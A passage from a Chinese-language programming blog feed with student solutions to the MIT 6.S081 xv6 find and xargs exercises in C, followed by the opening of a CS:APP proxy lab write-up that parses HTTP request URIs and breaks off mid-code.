通过文件描述符去read，但是这个时候要用<code>dirent</code>这个结构去读取每一个目录项<br>    3. 通过<code>dirent</code>的<code>name</code>以及当前目录的<code>path</code>，可以构造出这个目录项的<code>path</code><br>    4. 通过这个目录项的<code>path</code>和<code>stat</code>函数，可以把这个目录项的信息给读到<code>stat</code>结构中<br>    5. 通过<code>stat</code>结构体的<code>type</code>可以区分目录和文件<br>        1. 文件则直接比较名字<br>        2. 目录如果不是<code>.</code>和<code>..</code>，那就递归进去</h2><h2 id="注意点1-打开的文件描述符最好自己记得把它给关了"><a href="#注意点1-打开的文件描述符最好自己记得把它给关了" class="headerlink" title="注意点1. 打开的文件描述符最好自己记得把它给关了"></a>注意点<br>1. 打开的文件描述符最好自己记得把它给关了</h2><p>实现代码</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;kernel/types.h&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;kernel/stat.h&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;kernel/fs.h&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;user/user.h&quot;</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> O_RDONLY 0</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> MAX_PATH 512</span><br><br><span class="hljs-type">void</span> <span class="hljs-title function_">search</span><span class="hljs-params">(<span class="hljs-type">char</span>* dir, <span class="hljs-type">char</span>* filename)</span> &#123;<br>  <span class="hljs-comment">// 获取当前目录的文件描述符</span><br>  <span class="hljs-type">int</span> fd = open(dir, O_RDONLY);<br>  <span class="hljs-comment">// 不断读取目录项，进行判断</span><br>  <span class="hljs-comment">// 这个p是用来拼接这个目录中的子项的路径的</span><br>  <span class="hljs-type">char</span> buf[MAX_PATH];<br>  <span class="hljs-built_in">strcpy</span>(buf, dir);<br>  <span class="hljs-type">char</span>* p = buf + <span class="hljs-built_in">strlen</span>(buf);<br>  *p = <span class="hljs-string">&#x27;/&#x27;</span>;<br>  p++;<br>  <span class="hljs-comment">// 正式读取每一行，并根据目录还是文件进行讨论</span><br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">dirent</span> <span class="hljs-title">de</span>;</span><br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">stat</span> <span class="hljs-title">st</span>;</span><br>  <span class="hljs-keyword">while</span> (read(fd, &amp;de, <span class="hljs-keyword">sizeof</span>(de)) == <span class="hljs-keyword">sizeof</span>(de)) &#123;<br>    <span class="hljs-comment">// 无效</span><br>    <span class="hljs-keyword">if</span> (de.inum == <span class="hljs-number">0</span>) &#123;<br>      <span class="hljs-keyword">continue</span>;<br>    &#125;<br>    <span class="hljs-comment">// 拼接出目录的这一项的path</span><br>    memmove(p, de.name, DIRSIZ);<br>    p[DIRSIZ] = <span class="hljs-number">0</span>;<br>    <span class="hljs-comment">// 取出这一项的信息</span><br>    stat(buf, &amp;st);<br>    <span class="hljs-comment">// 如果是文件</span><br>    <span class="hljs-keyword">if</span> (st.type == T_FILE) &#123;<br>      <span class="hljs-comment">// 文件名相同，打印path</span><br>      <span class="hljs-keyword">if</span> (<span class="hljs-built_in">strcmp</span>(de.name, filename) == <span class="hljs-number">0</span>) &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%s\n&quot;</span>, buf);<br>      &#125;<br>    &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (st.type == T_DIR) &#123;<br>      <span class="hljs-comment">// 这一项是目录，只要不是 . 或者 .. 那就递归进去</span><br>      <span class="hljs-keyword">if</span> (<span class="hljs-built_in">strcmp</span>(de.name, <span class="hljs-string">&quot;.&quot;</span>) != <span class="hljs-number">0</span> &amp;&amp; <span class="hljs-built_in">strcmp</span>(de.name, <span class="hljs-string">&quot;..&quot;</span>) != <span class="hljs-number">0</span>) &#123;<br>        search(buf, filename);<br>      &#125;<br>    &#125;<br>  &#125;<br>  <span class="hljs-comment">// 记得关闭文件描述符</span><br>  close(fd);<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">char</span>** argv)</span> &#123;<br>  <span class="hljs-keyword">if</span> (argc != <span class="hljs-number">3</span>) &#123;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;usage: find dir filename\n&quot;</span>);<br>    <span class="hljs-built_in">exit</span>(<span class="hljs-number">1</span>);<br>  &#125;<br>  <span class="hljs-type">char</span>* dir = argv[<span class="hljs-number">1</span>];<br>  <span class="hljs-type">char</span>* filename = argv[<span class="hljs-number">2</span>];<br>  search(dir, filename);<br>  <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);<br>&#125;<br><br></code></pre></td></tr></table></figure><h1 id="xargs"><a href="#xargs" class="headerlink" title="xargs"></a>xargs</h1><hr><h2 id="题意1-实现xargs函数，xargs-a-b代表执行a程序，a程序的第一个参数是b，xargs会从标准输入中按行读取，将每一行作为a的其他参数，假如读入了某一行是c-d，那么说明a程序有三个参数，依次是b-c-d2-xargs按行读取的意思是，对于每一行，它都会读取这一行所有被空格分开的值，将它作为a程序的参数。假如有n行，就会执行n次a程序3-实验文档里给的示例echo-hello-too-xargs-echo-bye-1-这里面-的作用是把它前面的运行结果给放到后面这个函数的标准输入中-2-在这个例子里，就是把hello-too作为一行放到了xargs函数的标准输入里，也就是说，如果xargs能够调用scanf函数，就可以读到hello-too"><a href="#题意1-实现xargs函数，xargs-a-b代表执行a程序，a程序的第一个参数是b，xargs会从标准输入中按行读取，将每一行作为a的其他参数，假如读入了某一行是c-d，那么说明a程序有三个参数，依次是b-c-d2-xargs按行读取的意思是，对于每一行，它都会读取这一行所有被空格分开的值，将它作为a程序的参数。假如有n行，就会执行n次a程序3-实验文档里给的示例echo-hello-too-xargs-echo-bye-1-这里面-的作用是把它前面的运行结果给放到后面这个函数的标准输入中-2-在这个例子里，就是把hello-too作为一行放到了xargs函数的标准输入里，也就是说，如果xargs能够调用scanf函数，就可以读到hello-too" class="headerlink" title="题意1. 实现xargs函数，xargs a b代表执行a程序，a程序的第一个参数是b，xargs会从标准输入中按行读取，将每一行作为a的其他参数，假如读入了某一行是c d，那么说明a程序有三个参数，依次是b c d2. xargs按行读取的意思是，对于每一行，它都会读取这一行所有被空格分开的值，将它作为a程序的参数。假如有n行，就会执行n次a程序3. 实验文档里给的示例echo hello too | xargs echo bye    1. 这里面|的作用是把它前面的运行结果给放到后面这个函数的标准输入中    2. 在这个例子里，就是把hello too作为一行放到了xargs函数的标准输入里，也就是说，如果xargs能够调用scanf函数，就可以读到hello too"></a>题意<br>1. 实现xargs函数，<code>xargs a b</code>代表执行<code>a</code>程序，<code>a</code>程序的第一个参数是<code>b</code>，<code>xargs</code>会从<code>标准输</code>入中<code>按行读取</code>，将每一行作为<code>a</code>的其他参数，假如读入了某一行是<code>c d</code>，那么说明<code>a</code>程序有三个参数，依次是<code>b c d</code><br>2. <code>xargs</code>按行读取的意思是，对于每一行，它都会读取这一行所有被空格分开的值，将它作为<code>a程序的参数</code>。假如有<code>n</code>行，就会执行<code>n</code>次<code>a程序</code><br>3. 实验文档里给的示例<code>echo hello too | xargs echo bye</code><br>    1. 这里面<code>|</code>的作用是把它前面的运行结果给放到后面这个函数的标准输入中<br>    2. 在这个例子里，就是把<code>hello too</code>作为一行放到了<code>xargs</code>函数的标准输入里，也就是说，如果<code>xargs</code>能够调用<code>scanf</code>函数，就可以读到<code>hello too</code></h2><h2 id="思路1-从标准输入中不断地读取，以每一行为单位进行fork和exec2-每一行以-n为结束符，实验文档推荐我们每一次读一个字节，这样比较好判断-n，可以通过read函数实现读取3-读取的每个字节有三种情况-1-是空格，则说明空格前那个参数已经被读取完了，加入到之后要调用的exec函数的args数组中-2-是换行符，首先也要加入前面的参数，然后记得给args数组封尾，即放一个null在最后，之后fork，exec，并进入新一行的读取4-如果read失败，说明读完了，跳出整个循环，wait等到所有子进程结束"><a href="#思路1-从标准输入中不断地读取，以每一行为单位进行fork和exec2-每一行以-n为结束符，实验文档推荐我们每一次读一个字节，这样比较好判断-n，可以通过read函数实现读取3-读取的每个字节有三种情况-1-是空格，则说明空格前那个参数已经被读取完了，加入到之后要调用的exec函数的args数组中-2-是换行符，首先也要加入前面的参数，然后记得给args数组封尾，即放一个null在最后，之后fork，exec，并进入新一行的读取4-如果read失败，说明读完了，跳出整个循环，wait等到所有子进程结束" class="headerlink" title="思路1. 从标准输入中不断地读取，以每一行为单位进行fork和exec2. 每一行以\n为结束符，实验文档推荐我们每一次读一个字节，这样比较好判断\n，可以通过read函数实现读取3. 读取的每个字节有三种情况    1. 是空格，则说明空格前那个参数已经被读取完了，加入到之后要调用的exec函数的args数组中    2. 是换行符，首先也要加入前面的参数，然后记得给args数组封尾，即放一个null在最后，之后fork，exec，并进入新一行的读取4. 如果read失败，说明读完了，跳出整个循环，wait等到所有子进程结束"></a>思路<br>1. 从标准输入中不断地读取，以每一行为单位进行fork和exec<br>2. 每一行以<code>\n</code>为结束符，实验文档推荐我们每一次读一个字节，这样比较好判断<code>\n</code>，可以通过read函数实现读取<br>3. 读取的每个字节有三种情况<br>    1. 是空格，则说明空格前那个参数已经被读取完了，加入到之后要调用的exec函数的args数组中<br>    2. 是换行符，首先也要加入前面的参数，然后记得给args数组封尾，即放一个null在最后，之后fork，exec，并进入新一行的读取<br>4. 如果read失败，说明读完了，跳出整个循环，wait等到所有子进程结束</h2><h2 id="注意点1-我们不断从标准输入中读取，其实就是为了给exec函数准备参数数组，这里用args表示，一开始xargs的main函数的argv数组就包括了要执行的程序的一些信息，所以应该将其挪到args数组中2-当我们成功从某一行中读取一个参数的时候，这里是把这个参数边读边存到input-line字符串中，不能直接将这个字符串放到args数组，因为这个字符串被重复使用，所以我们要进行深拷贝，这里手写了一个strdup函数完成这个效果3-然后就是注意各种字符串的操作，要给它封住尾巴4-最后通过这个操作等待所有子进程结束while-wait-0-1"><a href="#注意点1-我们不断从标准输入中读取，其实就是为了给exec函数准备参数数组，这里用args表示，一开始xargs的main函数的argv数组就包括了要执行的程序的一些信息，所以应该将其挪到args数组中2-当我们成功从某一行中读取一个参数的时候，这里是把这个参数边读边存到input-line字符串中，不能直接将这个字符串放到args数组，因为这个字符串被重复使用，所以我们要进行深拷贝，这里手写了一个strdup函数完成这个效果3-然后就是注意各种字符串的操作，要给它封住尾巴4-最后通过这个操作等待所有子进程结束while-wait-0-1" class="headerlink" title="注意点1. 我们不断从标准输入中读取，其实就是为了给exec函数准备参数数组，这里用args表示，一开始xargs的main函数的argv数组就包括了要执行的程序的一些信息，所以应该将其挪到args数组中2. 当我们成功从某一行中读取一个参数的时候，这里是把这个参数边读边存到input_line字符串中，不能直接将这个字符串放到args数组，因为这个字符串被重复使用，所以我们要进行深拷贝，这里手写了一个strdup函数完成这个效果3. 然后就是注意各种字符串的操作，要给它封住尾巴4. 最后通过这个操作等待所有子进程结束while (wait(0) != -1)"></a>注意点<br>1. 我们不断从标准输入中读取，其实就是为了给exec函数准备参数数组，这里用args表示，一开始xargs的main函数的argv数组就包括了要执行的程序的一些信息，所以应该将其挪到args数组中<br>2. 当我们成功从某一行中读取一个参数的时候，这里是把这个参数边读边存到input_line字符串中，不能直接将这个字符串放到args数组，因为这个字符串被重复使用，所以我们要进行深拷贝，这里手写了一个strdup函数完成这个效果<br>3. 然后就是注意各种字符串的操作，要给它封住尾巴<br>4. 最后通过这个操作等待所有子进程结束<code>while (wait(0) != -1)</code></h2><p>实现代码</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;kernel/types.h&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;kernel/stat.h&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;user/user.h&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;kernel/param.h&quot;</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> stdin 0</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> NULL 0</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> MAX_SIZE 1024</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> CHAR_SIZE 1</span><br><br><span class="hljs-type">char</span>* <span class="hljs-title function_">strdup</span><span class="hljs-params">(<span class="hljs-type">char</span>* p)</span> &#123;<br>  <span class="hljs-type">char</span>* temp = (<span class="hljs-type">char</span>*)<span class="hljs-built_in">malloc</span>(<span class="hljs-built_in">strlen</span>(p) + <span class="hljs-number">1</span>);<br>  <span class="hljs-built_in">memcpy</span>(temp, p, <span class="hljs-built_in">strlen</span>(p));<br>  <span class="hljs-keyword">return</span> temp;<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">char</span>* argv[])</span> &#123;<br>  <span class="hljs-comment">// 初始化我们要传递给execute函数的参数</span><br>  <span class="hljs-type">char</span>* args[MAXARG + <span class="hljs-number">2</span>];<br>  <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">1</span>;i &lt; argc;i++) &#123;<br>    args[i - <span class="hljs-number">1</span>] = argv[i];<br>  &#125;<br>  <span class="hljs-type">int</span> arg_count = argc - <span class="hljs-number">1</span>;<br>  <span class="hljs-comment">// 从标准输入一行一行地读</span><br>  <span class="hljs-type">char</span> input_line[MAX_SIZE];<br>  <span class="hljs-keyword">while</span> (<span class="hljs-number">1</span>) &#123;<br>    <span class="hljs-comment">// 最外层的这个while循环，每循环一次代表要execute一次</span><br>    <span class="hljs-comment">// 因此arg_count和p都应该重置，其中p用来操作input_line</span><br>    arg_count = argc - <span class="hljs-number">1</span>;<br>    <span class="hljs-type">char</span>* p = input_line;<br>    <span class="hljs-comment">// 用read从标准输入端读</span><br>    <span class="hljs-type">int</span> res;<br>    <span class="hljs-keyword">while</span> ((res = read(<span class="hljs-built_in">stdin</span>, p, CHAR_SIZE)) &gt; <span class="hljs-number">0</span>) &#123;<br>      <span class="hljs-comment">// 如果读入的既不是空格也不是换行，那就让p++，继续读入这个参数</span><br>      <span class="hljs-keyword">if</span> (*p != <span class="hljs-string">&#x27; &#x27;</span> &amp;&amp; *p != <span class="hljs-string">&#x27;\n&#x27;</span>) &#123;<br>        p++;<br>        <span class="hljs-comment">// 读入的是空格，说明第一个参数已经完成了</span><br>        <span class="hljs-comment">// 那么我们可以将这个参数写入args，并且修改p指针</span><br>      &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (*p == <span class="hljs-string">&#x27; &#x27;</span>) &#123;<br>        *p = <span class="hljs-string">&#x27;\0&#x27;</span>;<br>        args[arg_count] = strdup(input_line);<br>        arg_count++;<br>        p = input_line;<br>        <span class="hljs-comment">// 读入的是换行，说明已经完全读完了</span><br>        <span class="hljs-comment">// 存当前的这个参数到args，并且为args增加一个结尾标志null</span><br>        <span class="hljs-comment">// 然后fork，exec</span><br>      &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (*p == <span class="hljs-string">&#x27;\n&#x27;</span>) &#123;<br>        *p = <span class="hljs-string">&#x27;\0&#x27;</span>;<br>        args[arg_count] = strdup(input_line);<br>        arg_count++;<br>        args[arg_count] = <span class="hljs-literal">NULL</span>;<br>        <span class="hljs-comment">// 子进程，去exec</span><br>        <span class="hljs-keyword">if</span> (fork() == <span class="hljs-number">0</span>) &#123;<br>          exec(args[<span class="hljs-number">0</span>], args);<br>          <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);<br>        &#125;<br>        <span class="hljs-comment">// 父进程，现在应该去读新的一行了，break</span><br>        <span class="hljs-keyword">break</span>;<br>      &#125;<br>    &#125;<br>    <span class="hljs-comment">// 读完了</span><br>    <span class="hljs-keyword">if</span> (res &lt;= <span class="hljs-number">0</span>) &#123;<br>      <span class="hljs-keyword">break</span>;<br>    &#125;<br>  &#125;<br>  <span class="hljs-comment">// 等待所有子进程结束</span><br>  <span class="hljs-keyword">while</span> (wait(<span class="hljs-number">0</span>) != <span class="hljs-number">-1</span>) &#123;<br>  &#125;<br>  <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);<br>&#125;<br><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>Operating System</category>
      
      <category>MIT6.S081</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Operating System</tag>
      
      <tag>MIT6.S081</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>csapp_lab7</title>
    <link href="/2023/08/08/csapp-lab7/"/>
    <url>/2023/08/08/csapp-lab7/</url>
    
    <content type="html"><![CDATA[<p><img src="http://woaixiaoxiao-image.oss-cn-beijing.aliyuncs.com/img/20231224203110.png" alt="20231224203110"></p><p>前情提要，如果看了书本，这个lab难度不高，但是如果不看书，难度还是挺高的，并且这个lab会用到cachelab中学到的东西，需要阅读</p><ol><li>第十章：系统编程</li><li>第十一章：网络编程</li><li>第十二章：并发</li></ol><h1 id="实验介绍"><a href="#实验介绍" class="headerlink" title="实验介绍"></a>实验介绍</h1><ol><li>使用代理完成客户端和服务器的连接（HTTP操作，socket通信）<ol><li>接受客户端的连接，读并分析请求</li><li>将请求发送给服务器</li><li>读取服务器的回应，并将回应发送给对应的客户端</li></ol></li><li>实现多线程的功能</li><li>增加cache功能</li></ol><h1 id="测试"><a href="#测试" class="headerlink" title="测试"></a>测试</h1><p>测试：.&#x2F;driver.sh<br>50 15 15</p><h1 id="第一部分：实现一个顺序的网络代理"><a href="#第一部分：实现一个顺序的网络代理" class="headerlink" title="第一部分：实现一个顺序的网络代理"></a>第一部分：实现一个顺序的网络代理</h1><h2 id="任务要求"><a href="#任务要求" class="headerlink" title="任务要求"></a>任务要求</h2><ol><li>最开始，代理应该监听某个端口来等待连接的请求，这个端口通过命令行给出</li><li>一旦建立连接，代理应该读取并解析请求。它需要确定这个请求是否发送了一个合法的HTTP请求</li><li>如果这个请求合法，则发送给服务器，然后将服务器的response返回给客户</li></ol><h2 id="具体实现"><a href="#具体实现" class="headerlink" title="具体实现"></a>具体实现</h2><ol><li><code>main</code>函数打开一个监听的描述符，如果通过这个监听描述符<code>accept</code>成功了，则打开了一个用于通信的描述符<code>fd</code>，将<code>fd</code>作为<code>doit</code>的函数，调用doit</li><li><code>doit</code>函数与描述符<code>b</code>建立通信，读取客户端发来的请求，这个请求一定是以下两种形式之一<ol><li>指定端口  <code>GET http://www.cmu.edu:8080/hub/index.html HTTP/1.1</code></li><li>固定端口80 <code>GET http://www.cmu.edu/hub/index.html HTTP/1.1</code></li></ol></li><li>将上面收到的请求分解，主要是得到中间的url，然后将url分解，得到<code>host</code>，<code>port</code>，<code>path</code>，以指定端口为例，这三个分别是<ol><li><code>www.cmu.edu</code></li><li><code>8080</code></li><li><code>/hub/index.html</code></li></ol></li><li>根据上面得到的三个参数，构建发往服务器的request</li><li>这个request是HTTP格式（具体实现上就把这个放到一个字符数组就行了，每一行通过<code>\r\n</code>隔开，并且最后要多一行<code>\r\n</code>），由请求头和请求行组成，实验文档要求格式如下：<ol><li><code>GET /hub/index.html HTTP/1.0</code></li><li><code>Host: www.cmu.edu</code></li><li><code>User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:10.0.3) Gecko/20120305 Firefox/10.0.3</code></li><li><code>Connection: close</code></li><li><code>Proxy-Connection: close</code></li></ol></li><li>与服务器建立连接，得到<code>server_fd</code>描述符，将上面已经生成好的request发往服务器</li><li>不断地读服务器返回的值，写入<code>fd</code>文件描述符<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;csapp.h&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;strings.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><br><span class="hljs-comment">/* Recommended max cache and object sizes */</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> MAX_CACHE_SIZE 1049000</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> MAX_OBJECT_SIZE 102400</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> MAXLINE 8192</span><br><br><span class="hljs-comment">/* You won&#x27;t lose style points for including this long line in your code */</span><br><span class="hljs-type">static</span> <span class="hljs-type">const</span> <span class="hljs-type">char</span> *user_agent_hdr =<br>    <span class="hljs-string">&quot;User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:10.0.3) Gecko/20120305 &quot;</span><br>    <span class="hljs-string">&quot;Firefox/10.0.3\r\n&quot;</span>;<br><br><span class="hljs-keyword">typedef</span> <span class="hljs-keyword">struct</span> &#123;<br>  <span class="hljs-type">char</span> host[MAXLINE];<br>  <span class="hljs-type">char</span> port[MAXLINE];<br>  <span class="hljs-type">char</span> path[MAXLINE];<br>&#125; URI;<br><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">cout_uri_format_error</span><span class="hljs-params">()</span> </span>&#123; <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;wrong uri format\n&quot;</span>); &#125;<br><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">parse_line</span><span class="hljs-params">(URI *req_uri, <span class="hljs-type">char</span> *uri)</span> </span>&#123;<br>  <span class="hljs-type">char</span> *host_start = <span class="hljs-built_in">strstr</span>(uri, <span class="hljs-string">&quot;://&quot;</span>);<br>  <span class="hljs-keyword">if</span> (host_start == <span class="hljs-literal">NULL</span>) &#123;<br>    <span class="hljs-built_in">cout_uri_format_error</span>();<br>    <span class="hljs-keyword">return</span>;<br>  &#125;<br>  host_start += <span class="hljs-number">3</span>;<br>  <span class="hljs-type">char</span> *port_start = <span class="hljs-built_in">strstr</span>(host_start, <span class="hljs-string">&quot;:&quot;</span>);<br>  <span class="hljs-type">char</span> *path_start = <span class="hljs-built_in">strstr</span>(host_start, <span class="hljs-string">&quot;/&quot;</span>);<br>  <span class="hljs-keyword">if</span> (path_start == <span class="hljs-literal">NULL</span>) &#123;<br>    <span class="hljs-built_in">cout_uri_format_error</span>();<br>    <span class="hljs-keyword">return</span>;<br>  &#125;<br>  <span class="hljs-built_in">strcpy</span>(req_uri-&gt;path, path_start);<br>  *path_start = <span class="hljs-string">&#x27;\0&#x27;</span>;<br>  <span class="hljs-keyword">if</span> (port_start != <span class="hljs-literal">NULL</span>) &#123;<br>    <span class="hljs-built_in">strcpy</span>(req_uri-&gt;port, port_start + <span class="hljs-number">1</span>);<br>    *port_start = <span class="hljs-string">&#x27;\0&#x27;</span>;<br>  &#125; <span class="hljs-keyword">else</span> &#123;<br>    <span class="hljs-built_in">strcpy</span>(req_uri-&gt;port, <span class="hljs-string">&quot;80&quot;</span>);<br>  &#125;<br>  <span class="hljs-built_in">strcpy</span>(req_uri-&gt;host, host_start);<br>  <span class="hljs-keyword">return</span>;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">build_req_server</span><span class="hljs-params">(<span class="hljs-type">char</span> *req_server, URI *req_uri)</span> </span>&#123;<br>  <span 